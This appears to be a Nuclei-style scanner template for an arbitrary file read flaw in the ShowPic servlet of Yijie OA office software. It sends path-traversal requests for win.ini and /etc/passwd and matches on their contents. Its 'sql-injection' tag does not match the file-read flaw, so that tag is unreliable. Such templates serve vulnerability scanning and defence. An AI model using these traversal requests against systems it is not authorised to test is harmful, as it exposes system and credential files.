id: poc-yaml-jieoa-showpic-read-any-file
info:
  name: 易捷OA协同办公软件ShowPic存在任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: GET
    path:
      - "{{BaseURL}}/servlet/ShowPic?filePath=../../windows/win.ini"
      - "{{BaseURL}}/servlet/ShowPic?filePath=../../../../../etc/passwd"
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'bit app support') && contains(body, 'fonts') && contains(body, 'extensions')"
      - type: dsl
        dsl:
          - "status_code == 200 && regex(body, 'root:[x*]:0:0:')"
